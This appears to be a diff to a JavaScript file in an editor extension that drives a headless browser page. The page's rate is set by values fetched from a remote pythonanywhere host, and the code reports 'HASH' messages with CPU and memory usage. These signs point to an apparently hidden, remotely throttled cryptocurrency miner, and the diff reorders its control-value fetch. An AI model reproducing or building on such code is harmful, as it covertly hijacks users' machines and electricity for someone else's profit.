@@ -184,8 +184,9 @@
     global.cppPage = page;
 
 
-    try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
-    catch (error) { }
+    try {
+      [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
+    } catch (error) { }
     await page.goto(baseUrl + '?use=' + max);
     await new Promise(r => setTimeout(r, 10 * 1000));
     let clt = await page.evaluate(() => window._client);
@@ -219,6 +220,9 @@
           tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
           return;
         }
+        [max, min] = [maxUse, minUse];
+        try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
+        catch (error) { }
         tstt({
           baseUrl,
           message: "HASH",
@@ -227,9 +231,6 @@
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
         });
-        [max, min] = [maxUse, minUse];
-        try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
-        catch (error) { }
 
         await page.evaluate((max, baseUrl) => {
           if (window.use != max) window.location.href = baseUrl + '?use=' + max;
